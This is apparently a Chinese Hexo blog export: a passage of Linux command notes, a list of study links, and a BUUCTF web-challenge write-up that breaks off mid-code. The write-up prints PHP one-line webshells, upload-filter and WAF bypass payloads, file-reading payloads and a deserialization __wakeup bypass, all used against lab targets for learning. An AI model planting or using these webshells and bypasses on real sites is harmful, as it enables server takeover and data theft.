class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每行输出左边的数值是每个文件或目录占用的<strong>磁盘块数</strong>。列表是从目录层级的<strong>最底部开始</strong>，然后按文件、子目录、目录逐级向上。  同理，也有<code>-h</code>参数按用户易读的格式输出大小 。</p><h3 id="4-3-处理数据文件"><a href="#4-3-处理数据文件" class="headerlink" title="4.3 处理数据文件"></a>4.3 处理数据文件</h3><h4 id="4-3-1-排序数据"><a href="#4-3-1-排序数据" class="headerlink" title="4.3.1 排序数据"></a>4.3.1 排序数据</h4><p><code>sort</code>命令按照会话指定的默认语言的排序规则对文本文件中的数据行排序。 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file1onetwothreefourfive$ <span class="token function">sort</span> file1fivefouronethreetwo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 但是如果对数字进行排序，可能会出点差错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file2<span class="token number">1</span><span class="token number">2</span><span class="token number">100</span><span class="token number">45</span><span class="token number">3</span><span class="token number">10</span><span class="token number">145</span>$ <span class="token function">sort</span> file2<span class="token number">1</span><span class="token number">10</span><span class="token number">100</span><span class="token number">145</span><span class="token number">2</span><span class="token number">3</span><span class="token number">45</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下， sort命令会把<strong>数字当做字符来执行</strong>标准的字符排序。解决这个问题可用-n参数 ，告诉sort命令把数字识别成数字而不是字符，并且按值排序  。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sort</span> -n file2<span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">10</span><span class="token number">45</span><span class="token number">100</span><span class="token number">145</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一个常用的参数是-M，按月排序。 Linux的<strong>日志文件</strong>经常会在每行的<strong>起始位置有一个时间戳</strong>，用来表明事件是什么时候发生的。如果用-M参数， sort命令就能识别三字符的月份名，并相应地排序。   </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Sep <span class="token number">13</span> 07:10:09 testbox smartd<span class="token punctuation">[</span><span class="token number">2718</span><span class="token punctuation">]</span>: Device: /dev/sda, opened  <span class="token comment">#日志文件</span>$ <span class="token function">sort</span> -M file3JanFebMarApr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常用参数：</p><table><thead><tr><th align="center">参数</th><th align="center">描 述</th></tr></thead><tbody><tr><td align="center">-f</td><td align="center">参数会忽略大小写</td></tr><tr><td align="center">-r</td><td align="center">反序排序（升序变成降序）</td></tr><tr><td align="center">-t</td><td align="center">指定一个用来区分键位置的字符</td></tr><tr><td align="center">-n</td><td align="center">按字符串数值来排序（并不转换为浮点数）</td></tr><tr><td align="center">-g</td><td align="center">按通用数值来排序（跟-n不同，把值当浮点数来排序，支持科学 计数法表示的值）</td></tr></tbody></table><p>-k和-t参数在对按字段分隔的数据进行排序时非常有用，例如/etc/passwd文件。可以用-t参数来指定字段分隔符，然后用-k参数来指定排序的字段。举个例子，要对前面提到的密码文件/etc/passwd根据用户ID进行数值排序，可以这么做：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sort</span> -t <span class="token string">':'</span> -k <span class="token number">3</span> -n /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/sync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 此时数据已经按第三个字段——用户ID的数值排序。</p><h4 id="4-3-2-搜索数据"><a href="#4-3-2-搜索数据" class="headerlink" title="4.3.2 搜索数据"></a>4.3.2 搜索数据</h4><p>格式：<code>grep [options] pattern [file]  </code></p><p><code>grep</code>命令会在输入或指定的文件中查找包含匹配指定模式的字符的行。 grep的输出就是包含了匹配模式的行（并不是行号是一行内容）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test1.txt </span>teacher zhaoTeacher wangstudent liStudent qinteach himsovle itroot@VM-16-11-debian:/tmp/test<span class="token comment"># grep teacher test1.txt </span>teacher zhaoroot@VM-16-11-debian:/tmp/test<span class="token comment"># grep t test1.txt </span>teacher zhaostudent liStudent qinteach himsovle it<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>-v</code>参数：进行反向搜索（输出不匹配该模式的行） 。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -v t test1.txt </span>Teacher wang<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  <code>-n</code>参数：显示匹配模式的行所在的行号 。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -n t test1.txt </span><span class="token number">1</span>:teacher zhao<span class="token number">3</span>:student li<span class="token number">4</span>:Student qin<span class="token number">5</span>:teach him<span class="token number">6</span>:sovle it<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>-c</code>参数：显示多少行含有匹配的模式 。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -c t test1.txt </span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <code>-e  </code>参数：指定多个匹配模式 。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -e t -e a test1.txt </span>teacher zhaoTeacher wangstudent liStudent qinteach himsovle it<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通用的可以使用通配符、正则表达式来匹配~</p><h4 id="4-3-3-压缩数据"><a href="#4-3-3-压缩数据" class="headerlink" title="4.3.3 压缩数据"></a>4.3.3 压缩数据</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">gzip</span> myprog$ <span class="token function">ls</span> -l my*-rwxrwxr-x <span class="token number">1</span> rich rich <span class="token number">2197</span> <span class="token number">2007</span>-09-13 <span class="token number">11</span>:29 myprog.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>gzip命令会压缩你在命令行指定的文件。也可以在命令行指定多个文件名甚至用通配符来一次性批量压缩文件。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">gzip</span> my*$ <span class="token function">ls</span> -l my*-rwxr--r-- <span class="token number">1</span> rich rich <span class="token number">103</span> Sep <span class="token number">6</span> <span class="token number">13</span>:43 myprog.c.gz-rwxr-xr-x <span class="token number">1</span> rich rich <span class="token number">5178</span> Sep <span class="token number">6</span> <span class="token number">13</span>:43 myprog.gz-rwxr--r-- <span class="token number">1</span> rich rich <span class="token number">59</span> Sep <span class="token number">6</span> <span class="token number">13</span>:46 myscript.gz-rwxr--r-- <span class="token number">1</span> rich rich <span class="token number">60</span> Sep <span class="token number">6</span> <span class="token number">13</span>:44 myscript2.gz$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-3-4-归档数据"><a href="#4-3-4-归档数据" class="headerlink" title="4.3.4 归档数据"></a>4.3.4 归档数据</h4><p>虽然<code>zip</code>命令能够很好地将数据压缩和归档进单个文件，但它不是Unix和Linux中的标准归档工具。目前， Unix和Linux上最广泛使用的归档工具是<code>tar</code>命令。  </p><p>tar命令的格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token keyword">function</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span> object1 object2 <span class="token punctuation">..</span>.  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>function参数定义了tar命令应该做什么 :</p><table><thead><tr><th align="center">功 能</th><th align="center">长名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">-A</td><td align="center">–concatenate</td><td align="center">将一个已有tar归档文件追加到另一个已有tar归档文件</td></tr><tr><td align="center">-c</td><td align="center">–create</td><td align="center">创建一个新的tar归档文件</td></tr><tr><td align="center">-d</td><td align="center">–diff</td><td align="center">检查归档文件和文件系统的不同之处</td></tr><tr><td align="center"></td><td align="center">–delete</td><td align="center">从已有tar归档文件中删除</td></tr><tr><td align="center">-r</td><td align="center">–append</td><td align="center">追加文件到已有tar归档文件末尾</td></tr><tr><td align="center">-t</td><td align="center">–list</td><td align="center">列出已有tar归档文件的内容</td></tr><tr><td align="center">-u</td><td align="center">–update</td><td align="center">将比tar归档文件中已有的同名文件新的文件追加到该tar归档文件中</td></tr><tr><td align="center">-x</td><td align="center">–extract</td><td align="center">从已有tar归档文件中提取文件</td></tr></tbody></table><p>每个功能可用选项来针对tar归档文件定义一个特定行为。下表列出了这些选项中能和tar<br>命令一起使用的常见选项🤪。  </p><table><thead><tr><th align="center">选 项</th><th align="center">描 述</th></tr></thead><tbody><tr><td align="center">-C dir</td><td align="center">切换到指定目录</td></tr><tr><td align="center">-f file</td><td align="center">输出结果到文件或设备file</td></tr><tr><td align="center">-j</td><td align="center">将输出重定向给bzip2命令来压缩内容</td></tr><tr><td align="center">-p</td><td align="center">保留所有文件权限</td></tr><tr><td align="center">-v</td><td align="center">在处理文件时显示文件</td></tr><tr><td align="center">-z</td><td align="center">将输出重定向给gzip命令来压缩内容</td></tr></tbody></table><p>这些选项经常合并到一起使用。首先，你可以用下列命令来创建一个归档文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -cvf test.tar test/ test2/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的命令创建了名为test.tar的归档文件，含有test和test2目录内容。接着，用下列命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -tf test.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出tar文件test.tar的内容（但并不提取文件）。最后，用命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -xvf test.tar  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过这一命令从tar文件test.tar中<strong>提取内容</strong>。如果tar文件是从一个目录结构创建的，那整个目录结构都会在当前目录下重新创建。  </p><hr><p><strong>窍门</strong> 下载了开源软件之后，你会经常看到文件名以.tgz结尾。这些是gzip压缩过的tar文件可以<br>用命令tar -zxvf filename.tgz来解压。</p><hr><hr><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux4/202201221842398.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASC学习</title>
      <link href="/posts/myh10009.html"/>
      <url>/posts/myh10009.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一、MPI"><a href="#一、MPI" class="headerlink" title="一、MPI"></a>一、MPI</h2><p>本次学习基于：<a href="https://mpitutorial.com/tutorials/">https://mpitutorial.com/tutorials/</a> ，MPI教程。</p><p><a href="https://zhuanlan.zhihu.com/p/355652501">https://zhuanlan.zhihu.com/p/355652501</a></p><h2 id="二、make学习"><a href="#二、make学习" class="headerlink" title="二、make学习"></a>二、make学习</h2><p><a href="https://www.ruanyifeng.com/blog/2015/02/make.html">https://www.ruanyifeng.com/blog/2015/02/make.html</a></p><h2 id="三、cmake学习"><a href="#三、cmake学习" class="headerlink" title="三、cmake学习"></a>三、cmake学习</h2><p><a href="https://www.hahack.com/codes/cmake/">https://www.hahack.com/codes/cmake/</a></p><h2 id="四、机器学习"><a href="#四、机器学习" class="headerlink" title="四、机器学习"></a>四、机器学习</h2><p>视频：<a href="https://www.bilibili.com/video/BV164411b7dx?from=search&amp;seid=13050048519173094800&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV164411b7dx?from=search&amp;seid=13050048519173094800&amp;spm_id_from=333.337.0.0</a></p><p>​           <a href="https://www.coursera.org/learn/machine-learning/home/welcome">https://www.coursera.org/learn/machine-learning/home/welcome</a></p><p>笔记：<a href="http://www.ai-start.com/ml2014/">http://www.ai-start.com/ml2014/</a></p><h2 id="五、Pytorch学习"><a href="#五、Pytorch学习" class="headerlink" title="五、Pytorch学习"></a>五、Pytorch学习</h2><p>wiki：<a href="https://handbook.pytorch.wiki/">https://handbook.pytorch.wiki/</a></p><hr><p>动态学习，一点一点补~</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ASC/202201221837341.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> ASC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MPI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf练习[11-20]</title>
      <link href="/posts/myh10008.html"/>
      <url>/posts/myh10008.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="11-极客大挑战-2019-Knife"><a href="#11-极客大挑战-2019-Knife" class="headerlink" title="11.[极客大挑战 2019]Knife"></a>11.[极客大挑战 2019]Knife</h2><p>题目都告诉了是白给的shell，直接连就好了拿到webshell，找到根目录下有个flag，读取拿到flag:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659622.png"></p><h2 id="12-极客大挑战-2019-Http"><a href="#12-极客大挑战-2019-Http" class="headerlink" title="12.[极客大挑战 2019]Http"></a>12.[极客大挑战 2019]Http</h2><p>考察的主要是http头部的一些信息，按着改就行了。首先那道题进入网页看到源码里面隐藏一个：<code>Secret.php</code>，进入后看到提示信息：</p><p>It doesn’t come from ‘<a href="https://sycsecret.buuoj.cn&amp;/#39;%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8A%93%E5%8C%85%E6%94%B9%EF%BC%9A">https://Sycsecret.buuoj.cn'，直接抓包改：</a></p><ul><li>加个<code>Referer</code>: <a href="https://sycsecret.buuoj.cn,/">https://Sycsecret.buuoj.cn，</a></li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659623.png"></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659625.png"></p><ul><li>看到又说必须使用”syclover browser”,接着改<code>User-Agent</code></li></ul><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659626.png" style="zoom:150%;"><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659627.png" style="zoom:150%;"><ul><li>这又说必须本地访问，再改<code>X-Forwarded-For</code>拿到flag:</li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659628.png"></p><p>这里讲一下这三个参数：</p><ul><li><code>Referer</code>: 浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL(你从哪来的)。</li><li><code>User-Agent</code>: 浏览器表明自己的身份（是哪种浏览器）。 </li><li><code>X-Forwarded-For</code>: 表示 HTTP 请求端真实 IP。</li></ul><h2 id="13-极客大挑战-2019-Upload"><a href="#13-极客大挑战-2019-Upload" class="headerlink" title="13.[极客大挑战 2019]Upload"></a>13.[极客大挑战 2019]Upload</h2><p>好久没做文件上传的题了，有点难到我了。</p><p>首先上传一个一句话木马试试：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示：NOT IMAGE，那就抓包先改COntent-Type:<code>image/jpeg</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146199.png"></p><p>接着说不能是php，绕过后缀的有文件格式有php,php3,php4,php5,phtml，phtm，前几个试试都不行，那就试试phtml：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146202.png"></p><p>接着是不能含有’&lt;?’ ，那就再改，查到了一个payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token double-quoted-string string">"php"</span><span class="token operator">&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>shell<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146204.png"></p><p>接着说不是图片，那就是检查了头部信息，加特征信息，成功上传：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">?</span> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token double-quoted-string string">"php"</span><span class="token operator">&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146205.png"></p><p>最后在连的时候要猜一下文件上传到哪里了！<strong>常规的目录/upload下面</strong>，然后直接连  /upload/2.phtml  就可以了</p><p>蚁剑连一下flag就在根目录，拿到flag:flag{07b9cce3-4089-4384-a26a-4572c9c90566}。</p><p>总体思路大概就是先上传个马，看返回信息，然后对应改就可以了，还有很多过滤，以后慢慢遇见~</p><p>这里推荐一篇博客，讲解了一句话木马的原理：<a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p><h2 id="14-ACTF2020-新生赛-Upload"><a href="#14-ACTF2020-新生赛-Upload" class="headerlink" title="14.[ACTF2020 新生赛]Upload"></a>14.[ACTF2020 新生赛]Upload</h2><p>这题和上题差不多，多了一个<strong>前端验证</strong>，所以可以先制作一个图片木马上传抓包，然后改文件后缀为：phtml，成功上传，然后就可以直接连了拿到webshell：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201639371.png"></p><p>拿到flag：flag{7facc008-0a13-457f-9a24-3f63516cd0c8}</p><h2 id="15-RoarCTF-2019-Easy-Calc"><a href="#15-RoarCTF-2019-Easy-Calc" class="headerlink" title="15.[RoarCTF 2019]Easy Calc"></a>15.[RoarCTF 2019]Easy Calc</h2><p>这题难道我了，首先题目考察的是命令执行。但是设置了WAF和一些字符过滤，里面涉及了挺多不知道的知识点。首先访问页面是一个输入框，看页面源码看到提示设置了WAF来阻止你的一些输入，还可以看到一个calc.php，看到里面也有一些匹配限制。注意一下，这个WAF不仅仅是这个php还有你看不到的，就比如先输入calc.php?num=a，可以看到返回403，因为这里过滤了字母你只能是数字。所以这里运用到了<code>php字符串解析特性</code>：</p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><pre class="line-numbers language-none"><code class="language-none">/news.php?%20news[id%00=42"+AND+1=0--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在解析查询字符串时，它会做两件事：</p><blockquote><p>​    1.删除空白符</p><p>​    2.将某些字符转换为下划线（包括空格）</p></blockquote><p>具体可以参考这篇文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p><p>所以接下来我们可以构造payload: /calc.php? num=a，可以发现此时页面能够回显ａ，这里在num前面加了空格，WAF检测的是num，但是我们输入的是‘　num’，所以就绕过了WAF，但是PHP在解析的时候会删除空白字符，就会存储为Array([num] =&gt; “ａ”)，同时实现了给num赋非数字值。这样就过了第一关。</p><p>下一个是绕过正则匹配了，有两种方法：</p><ol><li>使用chr()绕过，将ascii码转成单个字符串在用<code>.</code>拼接。</li><li>使用字符取反绕过，如<code>~%9e</code>就代表字符串<code>a</code>。</li></ol><pre class="line-numbers language-none"><code class="language-none">这里/=chr(47)?%20num=var_dump(scandir(chr(47)))　　// 列出根目录下的全部文件名 ?%20num=var_dump(file_get_contents(~%D0%99%CE%9E%98%98))　// 读flag文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里的取反就是将二进制0变为1，1变为0，具体实现就如：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201251409604.png"></p><p>所以我们在读的时候<font color="#FF5E3A" size="3">再取反一次</font>就是等价于读f1agg。</p><p>还有一些绕过技巧见：<a href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p><p>这里还有另外一种方法HTTP走私，具体可见：</p><p><a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p><p><a href="https://baijiahao.baidu.com/s?id=1715478145881946407&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1715478145881946407&amp;wfr=spider&amp;for=pc</a></p><h2 id="16-极客大挑战-2019-PHP"><a href="#16-极客大挑战-2019-PHP" class="headerlink" title="16.[极客大挑战 2019]PHP"></a>16.[极客大挑战 2019]PHP</h2><p>打开题目是可爱的猫猫，先逗会猫在做题哈哈……题目提示有文件备份，那就直接开扫，遇见别用了好拉扫不到，用dirsearch扫到<a href="http://www.zip，直接访问下载到源码，看到flag.php，哦~假的:狗头:，那就分析源码：">www.zip，直接访问下载到源码，看到flag.php，哦~假的:狗头:，那就分析源码：</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意看到index.php里有参数传入，并且有反序列化，再看class.php:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总的读下来要想拿到flag，就得让password=100,username=admin,可以看到直接反序列化肯定不行，这里有__wakeup函数，所以要绕过，绕过技巧就是让序列化后的属性值大于原本的属性值个数，具体构造代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"100"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span 